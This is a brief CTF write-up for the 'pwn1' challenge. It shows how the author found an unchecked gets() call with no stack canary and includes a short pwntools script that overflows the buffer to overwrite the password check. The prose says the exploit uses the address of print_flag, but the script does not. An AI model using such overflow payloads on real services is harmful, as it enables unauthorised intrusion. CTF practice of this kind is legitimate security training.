pwn1 asks the user to enter a passphrase.

```
This is a super secret program
Noone is allowed through except for those who know the secret!
What is my secret?

WHAT_DO_I_KNOW?

That is not the secret word!
```
So, I assume there will be some check somewhere.

I checked the results of [strings](https://man.cx/strings(1)) command to see if there is a password hardcoded into the program.

**Nope**, but nice try.

It's time for giving [radare2](https://rada.re/r/) a chance. Let's analyse...

The input is useless because is stored in `eax`... but the check with the password (which is `\xf0\x07\xba\x11`) is performed with a local variable set to 0.

So, how can I pwn it?

**Easy peasy!** there is a gets without length check: this means that I can write portions of the stack and do whatever I want with this program.

**Even better**, there is no canary!

I can write the password in the correct memory cell.
The exploit is some glibberish and than the address of the `print_flag` function.

BE CAREFUL: I assumed [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) was disabled on server.
So I opened a shell with ASLR disabled, got the address of `print_flag` and appended to the exploit string.
My assumption was correct! There is no ASLR on server side.

I used pwntools for crafting and simplicity. This is the script:

```python
from pwn import *
exc = remote('pwn.ctf.tamu.edu',4321)
exc.sendline('A'*23 + p32(0xf007ba11))
exc.interactive()
```

23 is the lenght of the input string buffer in stack (found with radare2).

Flag captured ;-)
